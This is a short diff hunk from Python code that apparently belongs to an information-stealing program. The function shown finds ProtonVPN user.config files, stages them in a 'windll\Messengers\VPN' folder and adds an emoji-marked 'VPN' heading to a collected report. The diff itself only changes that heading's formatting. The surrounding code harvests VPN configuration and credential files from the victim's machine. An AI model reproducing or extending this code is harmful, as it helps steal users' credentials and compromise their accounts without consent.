@@ -36,7 +36,7 @@ def VPN(data):
                 logs[key] = ''.join(glob.glob(value+"\\ProtonVPN.exe*"))+'\\'+os.listdir(''.join(glob.glob(value+"\\ProtonVPN.exe*")))[0] + '\\user.config'
     
     if logs:
-            data.append("\n\n<b>📡VPN📡</b>")
+            data.append("\n\n\n**📡VPN📡**")
             os.mkdir(rf'{local}\windll\Messengers\VPN')
             for key, value in logs.items():
                 os.mkdir(rf'{local}\windll\Messengers\VPN/'+key+'\\')
